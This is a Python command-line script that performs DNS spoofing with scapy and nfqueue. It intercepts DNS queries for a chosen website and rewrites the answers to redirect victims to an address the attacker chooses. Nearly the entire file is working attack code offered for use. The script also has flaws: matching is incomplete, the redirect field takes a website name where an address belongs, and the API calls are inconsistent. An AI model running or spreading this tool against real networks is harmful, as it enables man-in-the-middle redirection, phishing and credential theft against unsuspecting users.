import nfqueue
from scapy.all import *
import argparse

from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP


def spoof_dns(packet, spoof_website, redirect_website):
    scapy_packet = IP(packet.get_data())

    if scapy_packet.haslayer(DNSQR):
        qname = scapy_packet[DNSQR].qname.decode()
        if spoof_website in qname:
            print("[+] Spoofing Target: " + qname)
            answer = DNSRR(
                rrname=qname,
                rdata=redirect_website
            )
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1

            # Recalculate IP and UDP checksums
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum

            # Set the modified packet as payload
            packet.set_verdict_modified(nfqueue.NF_ACCEPT, bytes(scapy_packet), len(scapy_packet))

    else:
        packet.set_verdict(nfqueue.NF_ACCEPT)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--spoof", dest="spoof_website", help="Specify a website to spoof")
    parser.add_argument("-r", "--redirect", dest="redirect_website", help="Specify a website to redirect the user")
    args = parser.parse_args()

    if not args.spoof_website or not args.redirect_website:
        parser.error(
            "[-] Please specify both the website to spoof and the redirect website. Use --help for more details.")

    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(lambda packet: spoof_dns(packet, args.spoof_website, args.redirect_website))
    q.create_queue(0)

    try:
        q.try_run()
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C, Exiting...")

    q.unbind()
    q.close()


if __name__ == '__main__':
    main()